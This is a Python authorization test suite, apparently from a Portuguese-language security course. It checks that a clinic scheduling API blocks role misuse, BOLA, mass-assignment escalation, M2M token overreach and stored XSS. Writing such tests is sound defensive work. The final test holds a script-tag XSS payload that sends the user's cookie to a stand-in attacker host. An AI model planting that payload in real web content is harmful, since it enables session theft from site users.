"""
Suíte de testes de autorização.

Começa no Exercício 6 (um teste: usuário sem papel de admin é bloqueado de
rota administrativa) e é expandida no Exercício 12 para cobrir os demais
vetores de ataque mapeados no threat model do Exercício 4 (docs/02) —
não apenas RBAC simples, mas BOLA, escalonamento de privilégio via
mass-assignment, e isolamento do token M2M.
"""
from sqlmodel import Session

from app.config import get_settings
from tests.conftest import register_and_login

# --------------------------------------------------------------------------
# Exercício 6 — teste base
# --------------------------------------------------------------------------
def test_non_admin_blocked_from_admin_route(client, session: Session):
    """Um usuário sem papel de admin não pode criar profissionais
    (rota restrita a UserRole.ADMIN)."""
    recep_token = register_and_login(client, session, username="recep1", password="SenhaForteRecep1", role="recepcionista")

    r = client.post(
        "/professionals",
        json={"full_name": "Dr. Invasor", "specialty": "x", "license_number": "CRM-SP-000001"},
        headers={"Authorization": f"Bearer {recep_token}"},
    )

    assert r.status_code == 403


# --------------------------------------------------------------------------
# Exercício 12 — expansão para outros vetores do threat model (STRIDE)
# --------------------------------------------------------------------------
def _setup_two_professionals(client, session: Session, tomorrow_iso: str):
    admin_token = register_and_login(client, session, username="admin1", password="SenhaForte123", role="admin")
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    r = client.post(
        "/professionals",
        json={"full_name": "Dra. Ana", "specialty": "Cardiologia", "license_number": "CRM-SP-111111"},
        headers=admin_headers,
    )
    prof_a_id = r.json()["id"]
    r = client.post(
        "/professionals",
        json={"full_name": "Dr. Bruno", "specialty": "Dermatologia", "license_number": "CRM-SP-222222"},
        headers=admin_headers,
    )
    prof_b_id = r.json()["id"]

    token_a = register_and_login(client, session, username="ana", password="SenhaForteAna1", role="profissional", professional_id=prof_a_id)
    token_b = register_and_login(client, session, username="bruno", password="SenhaForteBruno1", role="profissional", professional_id=prof_b_id)

    recep_token = register_and_login(client, session, username="recep1", password="SenhaForteRecep1", role="recepcionista")
    r = client.post(
        "/patients",
        json={"full_name": "Carlos", "cpf": "12345678901", "birth_date": "1990-05-10", "phone": "+5511999998888", "email": "c@example.com"},
        headers={"Authorization": f"Bearer {recep_token}"},
    )
    patient_id = r.json()["id"]

    r = client.post(
        "/appointments",
        json={"patient_id": patient_id, "professional_id": prof_a_id, "scheduled_at": f"{tomorrow_iso}T10:00:00", "notes": "consulta de Ana"},
        headers={"Authorization": f"Bearer {token_a}"},
    )
    appt_a_id = r.json()["id"]

    return {
        "prof_a_id": prof_a_id,
        "prof_b_id": prof_b_id,
        "token_a": token_a,
        "token_b": token_b,
        "appt_a_id": appt_a_id,
    }


def test_bola_blocked_on_get(client, session: Session, tomorrow_iso: str):
    """T-2 do threat model: Tampering via BOLA. Bruno não pode ler a
    consulta de Ana trocando o ID na URL."""
    ctx = _setup_two_professionals(client, session, tomorrow_iso)
    r = client.get(f"/appointments/{ctx['appt_a_id']}", headers={"Authorization": f"Bearer {ctx['token_b']}"})
    assert r.status_code == 404  # não confirma nem a existência do recurso


def test_bola_blocked_on_update(client, session: Session, tomorrow_iso: str):
    """Mesmo vetor de BOLA, mas na escrita — Bruno tentando alterar a
    consulta de Ana, não só lê-la."""
    ctx = _setup_two_professionals(client, session, tomorrow_iso)
    r = client.patch(
        f"/appointments/{ctx['appt_a_id']}",
        json={"notes": "nota forjada por Bruno"},
        headers={"Authorization": f"Bearer {ctx['token_b']}"},
    )
    assert r.status_code == 404


def test_bola_blocked_on_list(client, session: Session, tomorrow_iso: str):
    """A listagem de consultas de um profissional nunca inclui consultas
    de colegas (mesma classe de falha do Exercício 8, na listagem)."""
    ctx = _setup_two_professionals(client, session, tomorrow_iso)
    r = client.get("/appointments", headers={"Authorization": f"Bearer {ctx['token_b']}"})
    assert r.status_code == 200
    ids = [appt["id"] for appt in r.json()]
    assert ctx["appt_a_id"] not in ids


def test_privilege_escalation_via_mass_assignment_blocked(client, session: Session):
    """T-4 do threat model: Elevation of Privilege tentando injetar um
    campo não declarado (ex.: is_active_override) no cadastro. Pydantic
    com extra='forbid' rejeita a requisição inteira com 422."""
    r = client.post(
        "/auth/register",
        json={
            "username": "atacante",
            "password": "SenhaForteAtacante1",
            "role": "recepcionista",
            "is_active_override": True,
        },
    )
    assert r.status_code == 422


def test_professional_cannot_create_appointment_for_colleague(client, session: Session, tomorrow_iso: str):
    """Mass-assignment mais sutil: Ana tenta criar uma consulta em nome do
    Bruno enviando professional_id de outra pessoa no corpo. A API ignora
    o valor enviado e usa o professional_id do próprio token."""
    ctx = _setup_two_professionals(client, session, tomorrow_iso)
    recep_token = register_and_login(client, session, username="recep2", password="SenhaForteRecep2", role="recepcionista")
    r = client.post(
        "/patients",
        json={"full_name": "Outro Paciente", "cpf": "98765432100", "birth_date": "1985-01-01", "phone": "+5511988887777", "email": "o@example.com"},
        headers={"Authorization": f"Bearer {recep_token}"},
    )
    patient_id = r.json()["id"]

    r = client.post(
        "/appointments",
        json={"patient_id": patient_id, "professional_id": ctx["prof_b_id"], "scheduled_at": f"{tomorrow_iso}T11:00:00", "notes": "tentativa"},
        headers={"Authorization": f"Bearer {ctx['token_a']}"},
    )
    assert r.status_code == 201
    assert r.json()["professional_id"] == ctx["prof_a_id"]  # não é prof_b_id


def test_m2m_token_cannot_access_human_routes(client, session: Session):
    """T-5 do threat model: token do laboratório comprometido não deve
    servir para nada além da consulta de disponibilidade."""
    settings = get_settings()

    r = client.post(
        "/auth/lab-token",
        data={
            "grant_type": "client_credentials",
            "client_id": settings.lab_client_id,
            "client_secret": settings.lab_client_secret,
        },
    )
    assert r.status_code == 200
    lab_token = r.json()["access_token"]

    for path in ["/patients", "/appointments", "/professionals"]:
        r = client.get(path, headers={"Authorization": f"Bearer {lab_token}"})
        assert r.status_code == 403, f"token M2M conseguiu acessar {path}"


def test_m2m_wrong_secret_rejected(client, session: Session):
    settings = get_settings()

    r = client.post(
        "/auth/lab-token",
        data={
            "grant_type": "client_credentials",
            "client_id": settings.lab_client_id,
            "client_secret": "senha-errada",
        },
    )
    assert r.status_code == 401


def test_unauthenticated_request_rejected(client, session: Session):
    r = client.get("/appointments")
    assert r.status_code == 401


def test_stored_xss_payload_rejected_at_input(client, session: Session):
    """T-3 do threat model: XSS armazenado. A validação de entrada rejeita
    o payload óbvio antes mesmo de chegar ao banco (defesa em profundidade
    — a defesa principal é o auto-escape do Jinja2 na saída, testado à
    parte na suíte HTML)."""
    admin_token = register_and_login(client, session, username="admin1", password="SenhaForte123", role="admin")
    r = client.post(
        "/professionals",
        json={"full_name": "Dra. Ana", "specialty": "Cardiologia", "license_number": "CRM-SP-111111"},
        headers={"Authorization": f"Bearer {admin_token}"},
    )
    prof_id = r.json()["id"]
    token = register_and_login(client, session, username="ana", password="SenhaForteAna1", role="profissional", professional_id=prof_id)

    recep_token = register_and_login(client, session, username="recep1", password="SenhaForteRecep1", role="recepcionista")
    r = client.post(
        "/patients",
        json={"full_name": "Carlos", "cpf": "12345678901", "birth_date": "1990-05-10", "phone": "+5511999998888", "email": "c@example.com"},
        headers={"Authorization": f"Bearer {recep_token}"},
    )
    patient_id = r.json()["id"]

    from datetime import date, timedelta

    tomorrow = (date.today() + timedelta(days=1)).isoformat()
    r = client.post(
        "/appointments",
        json={
            "patient_id": patient_id,
            "professional_id": prof_id,
            "scheduled_at": f"{tomorrow}T10:00:00",
            "notes": "<script>document.location='https://atacante.example/roubo?c='+document.cookie</script>",
        },
        headers={"Authorization": f"Bearer {token}"},
    )
    assert r.status_code == 422
